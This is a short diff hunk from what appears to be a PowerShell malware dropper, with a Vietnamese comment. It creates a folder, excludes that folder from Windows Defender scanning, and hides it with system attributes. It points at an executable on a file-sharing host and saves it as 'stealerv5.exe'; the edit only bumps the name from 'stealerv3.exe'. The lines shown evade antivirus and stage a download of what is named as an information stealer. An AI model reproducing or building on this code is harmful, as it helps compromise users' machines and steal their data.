@@ -5,7 +5,7 @@ New-Item -ItemType Directory -Path $dir
 Add-MpPreference -ExclusionPath $dir
 attrib +h +s $dir
 $folderPath = $dir
-$filePath = "$folderPath\stealerv3.exe"
+$filePath = "$folderPath\stealerv5.exe"
 $url = "https://anonsharing.com/file/7e713a235817c63a/sigma_999.exe"
 
 # Tạo thư mục nếu chưa tồn tại
